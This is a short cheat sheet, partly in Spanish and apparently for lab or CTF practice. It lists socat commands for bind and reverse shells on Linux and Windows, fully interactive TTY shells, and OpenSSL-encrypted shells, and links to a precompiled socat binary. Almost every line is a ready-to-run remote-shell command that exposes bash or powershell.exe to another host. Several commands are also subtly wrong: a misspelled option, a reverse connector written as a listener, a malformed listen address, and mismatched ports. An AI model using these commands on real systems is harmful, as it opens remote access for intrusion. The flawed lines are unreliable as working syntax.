
# Socat

## Bind shell
```
socat tcp-l:4444 exec:"bash -li"
socat tcp:10.10.53.160:4444 -
```

## Reverse shell
```
socat tcp-l:1234 -
socat tcp:10.13.6.113:1234 exec:"bash -li"
 ```

## Bind shell con esteroides
```
socat tcp-l:4444 exec:"bash -li",pty,stderr,sigint,setsid,sane 
socat tcp:10.10.53.160:4444 FILE:`tty`,raw,echo=0 
```

## Reverse shell con esteroides
```
socat tcp-l:1234 FILE:`tty`,raw,echo=0 
socat tcp:10.10.53.160:1234 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```


## Encriptado

- Crear llave y certificado
```
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem
```


### Bind socat ssl
 
```
socat OPENSSL-LISTEN:2020,cert=shell.pem,verify=0 EXEC:/bin/bash,pipes  
socat OPENSSL:localhost:2020,verify=0 -
```

### Reverse

```
socat OPENSSL-LISTEN:2020,cert=shell.pem,verify=0 - 
socat OPENSSL-LISTEN:localhost:2020,verifiy=0 EXEC:/bin/bash
```


### listener ssl tty

```
socat openssl-listen:TCP-L:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0
socat openssl:TCP:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```


### Windows bind shell

```
socat TCP-L:1234 EXEC:powershell.exe,pipes
socat tcp:10.10.228.97:4444 -
```

## Windows Reverse shell ??
```
socat tcp-l:1234 -
socat tcp:10.13.6.113:1234 exec:"powershell.exe"
 ```






Ref:
[precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true)